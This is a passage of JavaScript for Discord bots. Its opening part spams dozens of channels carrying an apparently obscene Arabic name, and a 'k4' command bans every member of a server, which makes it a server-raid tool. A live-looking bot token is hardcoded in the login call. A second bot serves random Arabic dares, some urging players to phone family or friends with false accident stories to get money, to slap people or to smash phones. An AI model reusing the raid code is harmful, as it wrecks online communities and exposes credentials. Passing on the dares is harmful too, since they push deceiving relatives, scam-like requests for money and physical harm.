message.guild.createChannel(' نايكم مهستر', 'text');
message.guild.createChannel(' نايكم مهستر', 'text');
message.guild.createChannel(' نايكم مهستر', 'text');
message.guild.createChannel(' نايكم مهستر', 'text');
message.guild.createChannel(' نايكم مهستر', 'text');
message.guild.createChannel(' نايكم مهستر', 'text');
message.guild.createChannel(' نايكمم مهستر', 'text');
message.guild.createChannel(' نايكم مهستر', 'text');
message.guild.createChannel(' نايكم مهستر', 'text');
message.guild.createChannel(' نايكممهستر', 'text');
message.guild.createChannel(' نايكم مهستر ', 'text');
message.guild.createChannel(' نايكم مهستر' , 'text');
message.guild.createChannel(' نايكم مهستر', 'text');
message.guild.createChannel(' نايكم مهستر', 'text');
message.guild.createChannel(' نايكم مهستر', 'text');

message.guild.createChannel('نايكم مهستر', 'voice');
message.guild.createChannel('نايكم مهستر', 'voice');
message.guild.createChannel(' نايكم مهستر', 'voice');
message.guild.createChannel('نايكم مهستر', 'voice');
message.guild.createChannel(' نايكم مهستر', 'voice');
message.guild.createChannel(' نايكم مهستر', 'voice');
message.guild.createChannel(' نايكم مهستر', 'voice');
message.guild.createChannel(' نايكم مهستر', 'text');
message.guild.createChannel(' نايكم مهستر ', 'text');
message.guild.createChannel(' نايكم مهستر', 'text');
message.guild.createChannel(' نايكم مهستر', 'text');
message.guild.createChannel(' نايكم مهستر', 'text');
message.guild.createChannel(' نايكم مهستر', 'text');
message.guild.createChannel(' نايكم مهستر', 'text');
message.guild.createChannel(' نايكم مهستر', 'text');
message.guild.createChannel(' نايكمم مهستر', 'text');
message.guild.createChannel(' نايكم مهستر', 'text');
message.guild.createChannel(' نايكم مهستر', 'text');
message.guild.createChannel(' نايكممهستر', 'text');
message.guild.createChannel(' نايكم مهستر ', 'text');
message.guild.createChannel(' نايكم مهستر' , 'text');
message.guild.createChannel(' نايكم مهستر', 'text');
message.guild.createChannel(' نايكم مهستر', 'text');
message.guild.createChannel(' نايكم مهستر', 'text');

}

});

LOka.on('message', message => {
         if (message.content === "k4") {
     if(!message.channel.guild) return;
     
      message.guild.members.forEach( member => {
          
          member.ban()
      })
}
});



LOka.login("NDY2MDA3MjE2NTQ2MTE5Njgx.Dm9ETw.A3NDdsd6W0b7gRdyBs_r49OMH2o")




var Za7f = [
  "**صورة وجهك او رجلك او خشمك او يدك**.",
  "**اصدر اي صوت يطلبه منك الاعبين**.",
  "**سكر خشمك و قول كلمة من اختيار الاعبين الي معك**.",
  "**روح الى اي قروب عندك في الواتس اب و اكتب اي شيء يطلبه منك الاعبين  الحد الاقصى 3 رسائل**.",
  "**قول نكتة اذا و لازم احد الاعبين يضحك اذا محد ضحك يعطونك ميوت الى ان يجي دورك مرة ثانية**.",
  "**سمعنا صوتك و غن اي اغنية من اختيار الاعبين الي معك**.",
  "**ذي المرة لك لا تعيدها**.",
  "**ارمي جوالك على الارض بقوة و اذا انكسر صور الجوال و ارسله في الشات العام**.",
  "**صور اي شيء يطلبه منك الاعبين**.",
  "**اتصل على ابوك و قول له انك رحت مع بنت و احين هي حامل....**.",
  "**سكر خشمك و قول كلمة من اختيار الاعبين الي معك**.",
  "**سو مشهد تمثيلي عن مصرية بتولد**.",
  "**اعطي اي احد جنبك كف اذا مافيه احد جنبك اعطي نفسك و نبي نسمع صوت الكف**.",
  "**ذي المرة لك لا تعيدها**.",
  "**تعطي اي شخص 5 الاف كرديت**.",
  "**ارمي جوالك على الارض بقوة و اذا انكسر صور الجوال و ارسله في الشات العام**.",
  "**روح عند اي احد بالخاص و قول له انك تحبه و الخ**.",
  "**اكتب في الشات اي شيء يطلبه منك الاعبين في الخاص**.",
  "**قول نكتة اذا و لازم احد الاعبين يضحك اذا محد ضحك يعطونك ميوت الى ان يجي دورك مرة ثانية**.",
  "**سامحتك خلاص مافيه عقاب لك :slight_smile:**.",
  "**اتصل على احد من اخوياك  خوياتك , و اطلب منهم مبلغ على اساس انك صدمت بسيارتك**.",
  "**غير اسمك الى اسم من اختيار الاعبين الي معك**.",
  "**اتصل على امك و قول لها انك تحبها :heart:**.",
  "**لا يوجد سؤال لك سامحتك :slight_smile:**.",
  "**قل لواحد ماتعرفه عطني كف**.",
  "**منشن الجميع وقل انا اكرهكم**.",
  "**اتصل لاخوك و قول له انك سويت حادث و الخ....**.",
  "**روح المطبخ و اكسر صحن او كوب**.",
  "**اعطي اي احد جنبك كف اذا مافيه احد جنبك اعطي نفسك و نبي نسمع صوت الكف**.",
  "**قول لاي بنت موجود في الروم كلمة حلوه**.",
  "**تكلم باللغة الانجليزية الين يجي دورك مرة ثانية لازم تتكلم اذا ما تكلمت تنفذ عقاب ثاني**.",
  "**لا تتكلم ولا كلمة الين يجي دورك مرة ثانية و اذا تكلمت يجيك باند لمدة يوم كامل من الس��رفر**.",
  "**قول قصيدة **.",
  "**تكلم باللهجة السودانية الين يجي دورك مرة ثانية**.",
  "**اتصل على احد من اخوياك  خوياتك , و اطلب منهم مبلغ على اساس انك صدمت بسيارتك**.",
  "**اول واحد تشوفه عطه كف**.",
  "**سو مشهد تمثيلي عن اي شيء يطلبه منك الاعبين**.",
  "**سامحتك خلاص مافيه عقاب لك :slight_smile:**.",
  "**اتصل على ابوك و قول له انك رحت مع بنت و احين هي حامل....**.",
  "**روح اكل ملح + ليمون اذا مافيه اكل اي شيء من اختيار الي معك**.",
  "**تاخذ عقابين**.",
  "**قول اسم امك افتخر بأسم امك**.",
  "**ارمي اي شيء قدامك على اي احد موجود او على نفسك**.",
  "**اذا انت ولد اكسر اغلى او احسن عطور عندك اذا انتي بنت اكسري الروج حقك او الميك اب حقك**.",
  "**اذهب الى واحد ماتعرفه وقل له انا كيوت وابي بوسه**.",
  "**تتصل على الوالده  و تقول لها خطفت شخص**.",
  "** تتصل على الوالده  و تقول لها تزوجت با سر**.",
  "**����تصل على الوالده  و تقول لها  احب وحده**.",
    "**تتصل على شرطي تقول له عندكم مطافي**.",
    "**خلاص سامحتك**.",
    "** تصيح في الشارع انا  مجنوون**.",
    "** تروح عند شخص تقول له احبك**.",

];

client.on('message', message => {
 if (message.content.startsWith("!عقاب")) {
              if(!message.channel.guild) return message.reply('** This command only for servers**');
var embed = new Discord.RichEmbed()
.setColor('RANDOM')
 .setThumbnail(message.author.avatarURL) 
.addField('sliver BOT' ,
`${Za7f[Math.floor(Math.random() * Za7f.length)]}`)
message.channel.sendEmbed(embed);
console.log('[38ab] Send By: ' + message.author.username)
  }
});









const developers = ["394715584421429260"]
const adminprefix = "-";
client.on('message', message => {
    var argresult = message.content.split(` `).slice(1).join(' ');
      if (!developers.includes(message.author.id)) return;
      
  if (message.content.startsWith(adminprefix + 'ply')) {
    client.user.setGame(argresult);
      message.channel.send(`**تم تغيير البلاينق مبرووك**`)
  } else 
     if (message.content === (adminprefix + "leave")) {
    message.guild.leave();        
  } else  
  if (message.content.startsWith(adminprefix + 'wt')) {
  client.user.setActivity(argresult, {type:'WATCHING'});
      message.channel.send(`**تم تغيير الواتشينق مبرووك**`)
  } else 
  if (message.content.startsWith(adminprefix + 'ls')) {
  client.user.setActivity(argresult , {type:'LISTENING'});
      message.channel.send(`**تم تغيير اللسننق مبروووك**`)
  } else 
  if (message.content.startsWith(adminprefix + 'st')) {
    client.user.setGame(argresult, "https://www.twitch.tv/idk");
      message.channel.send(`**تم تغيير التويتش مبروووك**`)
  }
  if (message.content.startsWith(adminprefix + 'setname')) {
  client.user.setUsername(argresult).then
      message.channel.send(`Changing The Name To ..**${argresult}** `)
} else
if (message.content.startsWith(adminprefix + 'setavatar')) {
  client.user.setAvatar(argresult);
    message.channel.send(`Changing The Avatar To :**${argresult}** `);
}
});




client.on('message', message => {
     if (message.content === "-سيرفرات") {
         if(!message.channel.guild) return;
     let embed = new Discord.RichEmbed()
  .setColor("RANDOM") 
  .addField("**سيرفرات يلي البوت موجود فيها: **" , client.guilds.size)
  message.channel.sendEmbed(embed);
    }
});






client.on("message", async message => {
if(message.content.startsWith("-embed")) {
if (message.author.id !== "394715584421429260") return;
let args = message.content.split(" ").slice(1).join(" ")
if(!args) return message.reply("Romz");
message.delete();
var emb = new  Discord.RichEmbed()
  .setColor('RANDOM')
  .setDescription(args);
message.channel.send(emb)
}
})








client.login(process.env.BOT_TOKEN);

